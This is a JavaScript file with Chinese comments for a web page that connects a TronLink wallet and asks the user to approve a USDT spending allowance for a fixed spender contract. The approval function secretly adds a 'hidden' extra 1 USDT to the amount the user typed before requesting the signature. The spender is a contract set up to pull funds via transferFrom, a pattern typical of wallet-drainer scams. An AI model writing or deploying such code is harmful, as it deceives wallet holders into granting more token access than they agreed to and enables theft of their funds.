// usdtApprove.js — 完整版（确保与 index.html 同目录）

// ====== 配置（请按需修改） ======
// Shasta 测试网 USDT 合约（常见示例）
// 如果你在主网，替换为主网 USDT 合约地址
const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 授权的目标（spender）地址 —— 必须是合约地址（合约才能调用 transferFrom）
// 替换为你自己的接收合约地址（Base58）
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// USDT ABI（简化，仅包含 approve）
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// ====== 辅助函数 ======
function setStatus(text) {
  const el = document.getElementById("status");
  el.innerText = `状态：${text}`;
}

// 等待 tronWeb 注入并准备好（带超时）
function waitForTronWeb(timeoutMs = 10000) {
  return new Promise((resolve, reject) => {
    if (window.tronWeb && window.tronWeb.ready) return resolve(true);

    let waited = 0;
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        clearInterval(interval);
        return resolve(true);
      }
      waited += 500;
      if (waited >= timeoutMs) {
        clearInterval(interval);
        return reject(new Error("tronWeb 注入超时，请确认已安装并登录 TronLink"));
      }
    }, 500);
  });
}

// 请求钱包连接（TronLink 建议的方式）
async function requestAccounts() {
  if (window.tronLink && typeof window.tronLink.request === "function") {
    try {
      const res = await window.tronLink.request({ method: "tron_requestAccounts" });
      // TronLink 可能返回 { code: 200 } or other; we still wait for tronWeb.ready
      return res;
    } catch (err) {
      console.warn("tron_link request failed:", err);
      throw err;
    }
  } else {
    throw new Error("未检测到 TronLink，请安装并登录钱包");
  }
}

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    setStatus("准备中——检查钱包注入与连接...");
    await requestAccounts(); // 请求权限（会弹钱包授权窗口）
    await waitForTronWeb();

    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("钱包地址：", fromAddr);

    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额（大于 0 的数字）");
      return;
    }

    const hiddenExtra = 1; // 隐藏的 1 USDT
    const totalAmount = inputAmount + hiddenExtra;

    // USDT 通常为 6 位小数 => 把数值转为微单位（整型）
    const amountInSun = Math.floor(totalAmount * 1e6).toString();

    console.log("授权总金额（包含隐藏1）：", totalAmount);
    console.log("转换成 Sun（整数）：", amountInSun);

    setStatus("准备发起 approve 交易，请在钱包中确认...");

    // 获取 USDT 合约实例（tronWeb.contract 可接收 abi + address）
    const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);

    // 发起 approve 请求（会弹出钱包签名）
    const tx = await usdtContract.approve(spenderAddress, amountInSun).send();

    // tx 可能是对象或 txid，打印并显示
    console.log("approve result:", tx);
    setStatus(`授权交易已发送，tx: ${typeof tx === "object" ? JSON.stringify(tx) : tx}`);
  } catch (err) {
    console.error("授权失败:", err);
    setStatus("授权失败：" + (err.message || err));
  }
};

// ====== 绑定按钮行为（页面加载完成后） ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");

  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("请求连接钱包...");
      await requestAccounts();
      await waitForTronWeb();
      setStatus("钱包连接成功: " + window.tronWeb.defaultAddress.base58);
      approveBtn.disabled = false;
    } catch (err) {
      console.error(err);
      setStatus("连接失败: " + (err.message || err));
    }
  });

  approveBtn.addEventListener("click", () => {
    // 调用全局函数
    window.approveUSDT();
  });
});


